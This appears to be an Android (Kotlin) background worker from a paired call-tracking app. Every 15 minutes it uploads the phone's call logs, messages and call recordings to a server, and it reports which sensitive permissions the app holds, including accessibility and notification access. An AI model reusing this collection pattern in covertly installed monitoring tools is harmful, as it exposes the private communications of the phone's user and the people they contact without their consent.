package com.maestrolt.app

import android.content.Context
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.NotificationManagerCompat
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

/** بيبعت الطابور للسيرفر: المكالمات · الرسايل · التسجيلات · نبض الصحة. */
class SyncWorker(ctx: Context, params: WorkerParameters) : Worker(ctx, params) {
    override fun doWork(): Result {
        val ctx = applicationContext
        val prefs = Prefs(ctx)
        if (!prefs.paired) return Result.success()
        val api = Api(prefs)
        val q = Queue.get(ctx)
        return try {
            Calls.collect(ctx)   // احتياطي لو الخدمة مكانتش شغالة
            flush(api, q, "call", "/v1/device/calls", "calls")
            flush(api, q, "msg", "/v1/device/messages", "messages")
            if (prefs.recordingAllowed) uploadRecordings(ctx, api, q)
            heartbeat(ctx, api, prefs, q)
            prefs.lastSyncMs = System.currentTimeMillis()
            if (q.take("call", 1).isNotEmpty() || q.take("msg", 1).isNotEmpty()) Result.retry() else Result.success()
        } catch (e: Exception) {
            prefs.lastError = "sync: " + (e.message ?: e.javaClass.simpleName)
            Result.retry()
        }
    }

    private fun flush(api: Api, q: Queue, kind: String, path: String, field: String) {
        repeat(10) {
            val batch = q.take(kind, 100)
            if (batch.isEmpty()) return
            val arr = JSONArray()
            batch.forEach { arr.put(JSONObject(it.second)) }
            val r = api.post(path, JSONObject().put(field, arr))
            if (r.code == 200 && r.body?.optBoolean("ok") == true) q.delete(batch.map { it.first })
            else { q.bumpTries(batch.map { it.first }); throw IllegalStateException("$kind ${r.code}") }
        }
    }

    // التسجيلات: الملف بيظهر بعد المكالمة بشوية، فبنحاول كذا مرة على مدار ساعة
    private fun uploadRecordings(ctx: Context, api: Api, q: Queue) {
        for ((id, body) in q.take("rec_find", 20)) {
            val j = JSONObject(body)
            val start = j.getLong("start")
            val found = Calls.findRecording(ctx, start, j.getLong("dur"))
            if (found == null) {
                if (System.currentTimeMillis() - start > 3600_000L) q.delete(listOf(id))   // مفيش تسجيل للمكالمة دي ← المدة بس
                continue
            }
            val tmp = File(ctx.cacheDir, "rec_$id")
            try {
                ctx.contentResolver.openInputStream(found.uri)?.use { input -> tmp.outputStream().use { input.copyTo(it) } } ?: continue
                val r = api.putFile("/v1/device/recordings?started_at=" + Parse.iso(start), tmp, found.mime)
                if (r.code == 200 || r.code == 409) q.delete(listOf(id))   // 409 = التسجيل مقفول للعميل
                if (r.code == 409) Prefs(ctx).recordingAllowed = false
            } finally { tmp.delete() }
        }
    }

    private fun heartbeat(ctx: Context, api: Api, prefs: Prefs, q: Queue) {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
        val body = JSONObject()
            .put("app_version", BuildInfo.VERSION)
            .put("notif_access", NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName))
            .put("a11y_access", isA11yOn(ctx))
            .put("call_log", Calls.hasLogPermission(ctx))
            .put("audio_read", Calls.hasAudioPermission(ctx))
            .put("battery_exempt", pm.isIgnoringBatteryOptimizations(ctx.packageName))
            .put("last_error", prefs.lastError)
            .put("queue", q.count())
        val r = api.post("/v1/device/heartbeat", body)
        if (r.code == 200 && r.body != null) prefs.recordingAllowed = r.body.optBoolean("recording_allowed", false)
    }

    companion object {
        private const val NOW = "maestro-sync-now"
        private const val PERIODIC = "maestro-sync-15m"
        private val net = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()

        fun kick(ctx: Context) {
            WorkManager.getInstance(ctx).enqueueUniqueWork(NOW, ExistingWorkPolicy.KEEP,
                OneTimeWorkRequestBuilder<SyncWorker>().setConstraints(net).setInitialDelay(5, TimeUnit.SECONDS).build())
        }

        fun schedule(ctx: Context) {
            WorkManager.getInstance(ctx).enqueueUniquePeriodicWork(PERIODIC, ExistingPeriodicWorkPolicy.KEEP,
                PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES).setConstraints(net).build())
        }

        fun isA11yOn(ctx: Context): Boolean {
            val list = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
            return list.contains(ctx.packageName + "/")
        }
    }
}

object BuildInfo { const val VERSION = "1.0.0" }
